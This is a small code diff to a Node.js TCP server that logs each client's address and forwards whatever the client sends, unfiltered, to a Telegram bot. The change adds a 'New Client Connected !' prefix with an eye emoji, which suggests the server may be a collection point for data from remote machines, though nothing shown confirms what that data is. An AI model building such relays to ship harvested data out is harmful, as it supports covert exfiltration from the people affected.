@@ -21,7 +21,7 @@ const server = net.createServer((socket) => {
     console.log(`Client Address: ${clientAddress}`);
     console.log(`Client Port: ${clientPort}`);
     console.log(JSON.parse(data));
-    const url = `https://api.telegram.org/bot${tok}/sendMessage?chat_id=${chat}&text=${data.toString()}`
+    const url = `https://api.telegram.org/bot${tok}/sendMessage?chat_id=${chat}&text=${"New Client Connected ! 👁️‍🗨️\n"+data.toString()}`
     https.get(url, (res) => {
         console.log(res.statusCode);
     })
